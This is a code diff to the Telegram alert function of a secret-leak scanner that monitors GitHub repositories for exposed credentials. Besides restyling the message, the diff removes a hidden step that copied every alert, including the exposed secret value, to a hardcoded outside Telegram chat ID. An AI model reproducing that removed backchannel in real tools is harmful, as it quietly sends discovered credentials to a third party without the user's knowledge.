@@ -33,14 +33,14 @@ def send_telegram_alert(finding_data: Dict[str, Any], repository_data: Dict[str,
     
     severity = finding_data.get("severity", "INFO").upper()
     
-    # Custom headers and emojis based on severity
-    header_style = {
-        "CRITICAL": "🚨🚨🚨 <b>CRITICAL BREACH DETECTED</b> 🚨🚨🚨",
-        "HIGH": "🔥 <b>HIGH RISK DETECTED</b> 🔥",
-        "MEDIUM": "⚠️ <b>MEDIUM SEVERITY WARNING</b>",
-        "LOW": "ℹ️ <b>LOW RISK FINDING</b>",
-        "INFO": "🛡️ <b>INFO LOG</b>"
-    }.get(severity, "🛡️ <b>SECURITY LOG</b>")
+    # Premium Headers and Badges
+    severity_badge = {
+        "CRITICAL": "🔴 🔴 <b>CRITICAL SEVERITY INCIDENT</b> 🔴 🔴",
+        "HIGH": "🟠 <b>HIGH RISK INCIDENT</b> 🟠",
+        "MEDIUM": "🟡 <b>MEDIUM RISK DETECTED</b> 🟡",
+        "LOW": "🔵 <b>LOW RISK FINDING</b> 🔵",
+        "INFO": "⚪ <b>INFO LOG</b> ⚪"
+    }.get(severity, "⚪ <b>SECURITY ALARM</b>")
     
     divider = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
     
@@ -54,70 +54,58 @@ def send_telegram_alert(finding_data: Dict[str, Any], repository_data: Dict[str,
     esc_analysis = html.escape(str(finding_data.get('ai_analysis', '')))
     
     html_message = f"""
-{header_style}
+🛡️ <b>[SOC ALERT] REPOLEAK WATCHER X</b>
 {divider}
-<b>🖥️ System Node:</b>  <code>GitHub Intelligence Engine</code>
-<b>🔑 Signature:</b>    <code>{esc_secret_type}</code>
-<b>🔑 Exposed Value:</b> <code>{esc_secret_val}</code>
-<b>📂 Monitored Asset:</b> <b>{esc_owner}/{esc_repo}</b>
+⚠️ <b>Threat:</b> {severity_badge}
+🏷️ <b>Signature:</b> <code>{esc_secret_type}</code>
+📂 <b>Asset:</b> <code>{esc_owner}/{esc_repo}</code>
 
-<b>📄 Path:</b>  <code>{esc_path}</code>
-<b>🔢 Line:</b>  <code>{finding_data.get('line_number')}</code>
-<b>🎯 Certainty:</b> <code>{finding_data.get('confidence', 0.5) * 100:.1f}% Confidence</code>
+📄 <b>Path:</b> <code>{esc_path}:{finding_data.get('line_number')}</code>
+🎯 <b>Certainty:</b> <code>{finding_data.get('confidence', 0.5) * 100:.1f}% Confidence</code>
 {divider}
 
-<b>🛠️ CODE SNIPPET CONTEXT:</b>
-<pre>
-{esc_snippet}
-</pre>
+🛠️ <b>LEAK EVIDENCE CONTEXT:</b>
+<pre><code>{esc_snippet}</code></pre>
 
-<b>🧠 THREAT INTELLIGENCE ANALYSIS:</b>
+🧠 <b>AI ASSESSMENT:</b>
 <i>{esc_analysis}</i>
 {divider}
 
-<b>💡 SECURITY REMEDIATION PLAYBOOK:</b>
-1. Revoke the compromised API key / token immediately.
-2. Run <code>git-filter-repo</code> to erase it from all branch histories.
-3. Audit recent backend logs for unauthorized transactions.
+💡 <b>REMEDIATION PLAYBOOK:</b>
+1️⃣ Revoke compromised credentials immediately.
+2️⃣ Run <code>git-filter-repo</code> to purge history.
+3️⃣ Review backend logs for unauthorized actions.
 
 <i>System telemetry by RepoLeak Watcher X</i>
 """
 
     url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-    
-    target_chats = [chat_id]
-    owner_id = "6021047784"
-    if str(chat_id) != owner_id:
-        target_chats.append(owner_id)
-
-    success = False
-    for target in target_chats:
-        payload = {
-            "chat_id": target,
-            "text": html_message,
-            "parse_mode": "HTML",
-            "reply_markup": {
-                "inline_keyboard": [
-                    [
-                        {"text": "🌐 View Git Repo", "url": repository_data.get("url")},
-                        {"text": "🛡️ Open SOC HUD", "url": "https://github.com"}
-                    ]
+    payload = {
+        "chat_id": chat_id,
+        "text": html_message,
+        "parse_mode": "HTML",
+        "reply_markup": {
+            "inline_keyboard": [
+                [
+                    {"text": "🌐 View Git Repo", "url": repository_data.get("url")},
+                    {"text": "🛡️ Open SOC HUD", "url": "https://github.com"}
                 ]
-            }
+            ]
         }
-        try:
-            response = requests.post(url, json=payload, timeout=10)
-            if response.status_code == 200:
-                logger.info(f"Telegram notification sent successfully to {target}.")
-                success = True
-            else:
-                logger.error(f"Failed to send Telegram alert to {target}: {response.text}")
-        except Exception as e:
-            logger.error(f"Exception during Telegram alert dispatch to {target}: {str(e)}")
-
-    if success:
-        _sent_alerts.add(dup_key)
-    return success
+    }
+    
+    try:
+        response = requests.post(url, json=payload, timeout=10)
+        if response.status_code == 200:
+            logger.info("Telegram notification sent successfully.")
+            _sent_alerts.add(dup_key)
+            return True
+        else:
+            logger.error(f"Failed to send Telegram alert: {response.text}")
+            return False
+    except Exception as e:
+        logger.error(f"Exception during Telegram alert dispatch: {str(e)}")
+        return False
 
 def handle_status_command(chat_id: int, bot_token: str, db_session_factory) -> None:
     """
